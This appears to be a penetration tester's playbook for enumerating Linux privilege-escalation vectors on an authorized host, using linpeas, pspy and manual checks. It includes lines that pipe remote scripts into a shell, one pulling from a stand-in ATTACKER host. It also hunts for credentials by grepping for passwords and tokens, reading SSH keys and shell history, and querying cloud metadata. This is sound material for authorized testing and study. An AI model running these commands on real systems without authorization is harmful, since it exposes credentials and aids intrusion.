# Linux enumeration playbook — linpeas.sh first
# In-scope host, approval-gated, READ-ONLY recon. Enumeration changes nothing; save raw output as evidence.
# Goal: produce enum.json/enum.txt that the vector table in linux_privesc_playbook.md keys off.

Enumeration is the load-bearing half of privesc: you cannot pick the lowest-risk vector without a full
picture. Run **linpeas.sh** as the spine, `pspy` for the time dimension (cron/processes), and a manual
pass to confirm and catch what the scanner colour-codes but doesn't explain.

═══════════════════════════════════════════════════════════════════════════
## 1. linpeas.sh — the spine
═══════════════════════════════════════════════════════════════════════════

### Get it onto the target (pick by what the host allows)
```
# A) Direct (host has internet): fileless, nothing touches disk
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
wget -qO- https://.../linpeas.sh | sh

# B) No target internet — serve from YOUR box, pull over the foothold:
#    attacker:   python3 -m http.server 8000     (in the dir holding linpeas.sh)
#    target:     curl http://ATTACKER:8000/linpeas.sh | sh
#                wget http://ATTACKER:8000/linpeas.sh -O /dev/shm/lp.sh && chmod +x /dev/shm/lp.sh

# C) Already have a shell but no outbound: scp / sftp / base64 paste
#    attacker:   base64 -w0 linpeas.sh            (copy output)
#    target:     echo '<base64>' | base64 -d > /dev/shm/lp.sh && chmod +x /dev/shm/lp.sh

# Run from /dev/shm (RAM, usually exec-allowed even when /tmp is noexec) and KEEP the output:
cd /dev/shm && ./lp.sh -a | tee enum.txt        # -a = all checks (thorough)
```
Tips: if `/tmp`/`/dev/shm` are `noexec`, `sh lp.sh` (interpreter reads the file, no exec bit needed), or
run from a writable+exec dir you find. Always `tee` to a file — linpeas output IS your evidence.

### Invocation variants
```
./linpeas.sh -a            # ALL checks incl. slow/thorough (default is lighter) — use this first
./linpeas.sh -s            # "stealth"/superfast — fewer writes, quieter, less noise on monitored hosts
./linpeas.sh -e            # extra enumeration (more thorough per-section)
./linpeas.sh -o SysI,Devs  # only named sections (SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI,
                           #   SofI, IntFiles, …) — targeted re-runs
./linpeas.sh -L            # linpeas + wait, then run again (catch time-based cron)
./linpeas.sh -h            # list all flags/sections
PASSWORD=mypass ./linpeas.sh   # also try sudo checks if you know the current user's password
```

### Reading the output — the colour legend is the whole point
- 🔴🟡  **RED on YELLOW highlight = a 95–99% PE vector.** This is the headline: stop and investigate it first.
- 🔴     **Red = interesting / likely relevant** (a writable file, an odd capability, a cred string).
- 🟢     Green = defensive/benign info.
- linpeas tags findings against its own "Interesting Files", "SUID", "Capabilities", "Cron", "Software
  with known exploits" sections — each highlighted hit maps to a row in `linux_privesc_playbook.md`.
- It runs **LES (linux-exploit-suggester)** inline and flags the kernel/sudo/pkexec CVEs it matches.
Extract every highlighted line into `enum.json` (vector, evidence line, section) so the vector pass is driven
by evidence, not guesswork.

═══════════════════════════════════════════════════════════════════════════
## 2. pspy — the time dimension (no root needed)
═══════════════════════════════════════════════════════════════════════════
linpeas sees a snapshot; `pspy` watches processes/cron fire live — it catches root cron jobs, their full
command lines (often with paths/creds), and short-lived helpers linpeas can miss.
```
./pspy64 -pf -i 1000       # watch processes+files, poll 1s ; let it run a few minutes
# look for: UID=0 jobs running a script in a writable path, or calling a relative/missing binary (PATH hijack)
```

═══════════════════════════════════════════════════════════════════════════
## 3. Alternates / second opinions
═══════════════════════════════════════════════════════════════════════════
```
lse.sh -l1                 # linux-smart-enumeration, level 1 (then -l2 for everything) — cleaner than linpeas
./LinEnum.sh -t            # thorough mode
linux-exploit-suggester.sh # kernel/distro CVE matcher (also: linux-exploit-suggester-2.pl)
./les.sh                   # (same family) run on target, or feed `uname -a`/`/etc/os-release` to a copy on attacker
wes.py systeminfo.txt      # (Windows analogue — not here, noted for parity)
```
Cross-check kernel CVEs the suggester reports against `linux_privesc_playbook.md` → Kernel row (HIGH RISK:
feasibility-first on prod).

═══════════════════════════════════════════════════════════════════════════
## 4. Manual enumeration — confirm + fill gaps (mirrors linpeas sections)
═══════════════════════════════════════════════════════════════════════════
```
## System / kernel / distro
uname -a; cat /proc/version; cat /etc/os-release; cat /etc/issue; arch; dpkg -l 2>/dev/null; rpm -qa 2>/dev/null

## Users / sudo / groups  (sudo is the #1 real-world vector)
id; sudo -l                      # also reveals env_keep+=LD_PRELOAD / LD_LIBRARY_PATH, NOPASSWD rules
cat /etc/passwd; cat /etc/group; getent group sudo docker lxd disk adm
ls -la /home/*; ls -la ~/.ssh /root/.ssh 2>/dev/null
sudo -l 2>/dev/null | grep -i nopasswd

## SUID / SGID / capabilities  (match against GTFOBins)
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null                 # SUID
find / -perm -2000 -type f -exec ls -la {} \; 2>/dev/null                 # SGID
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
getcap -r / 2>/dev/null                                                   # file capabilities (cap_setuid!)
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null

## Cron / timers / services
cat /etc/crontab; ls -la /etc/cron.* /etc/cron.d 2>/dev/null; crontab -l 2>/dev/null
systemctl list-timers --all; ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
# writable unit/script = a root-run edit point:
find /etc/systemd /lib/systemd -writable -type f 2>/dev/null

## Writable paths / PATH
find / -writable -type d 2>/dev/null                 # world-writable dirs
find / -perm -2 -type f 2>/dev/null | grep -vE '^/proc|^/sys'   # world-writable files
echo $PATH                                            # a '.' or writable dir early in PATH = hijack
find / -writable ! -user $(whoami) -type f 2>/dev/null | head

## Network / internal services (pivoting + local-only services)
ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null   # 127.0.0.1-only ports = internal services
ip a; cat /etc/hosts; arp -a 2>/dev/null

## Credential hunting (loot)
grep -rniE 'password|passwd|secret|api[_-]?key|token' /etc /var/www /opt /home 2>/dev/null | head -50
find / -name '*.bak' -o -name '*.old' -o -name '*.orig' -o -name '*.sql' -o -name '*.conf' 2>/dev/null | head
cat ~/.bash_history ~/.zsh_history 2>/dev/null
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null
for p in /proc/*/cmdline; do strings -1 "$p" 2>/dev/null | tr '\n' ' '; echo; done | grep -iE 'pass|key|token' | head
cat /etc/exports 2>/dev/null                          # NFS no_root_squash?

## Containers / cloud
cat /proc/1/cgroup; ls -la /.dockerenv 2>/dev/null    # am I in a container?
ls -la /run/secrets 2>/dev/null; env | grep -iE 'aws|azure|gcp|k8s|token'
curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null   # cloud metadata (if applicable; → ssrf-cloud refs)

## Installed software vs GTFOBins (automate the match)
apt list --installed 2>/dev/null | tr '/' ' ' | cut -d' ' -f1,3 | sed 's/[0-9]://g' | tee installed_pkgs.list
# then cross-reference installed_pkgs.list against GTFOBins (see playbook) for SUID/sudo abusables
```

## Output → evidence contract
- `enum.txt`  : raw linpeas/pspy/manual output (verbatim, timestamped) — keep as PoC evidence.
- `enum.json` : the distilled vectors `[{vector, evidence, section, risk, next}]` driving the exploit pass.
- Enumeration is READ-ONLY. Anything that writes (dropping linpeas to /dev/shm, installed_pkgs.list) is
  recorded in `cleanup.md` and removed. Never claim a vector linpeas merely *colour-coded* — confirm it
  manually before it becomes a finding.
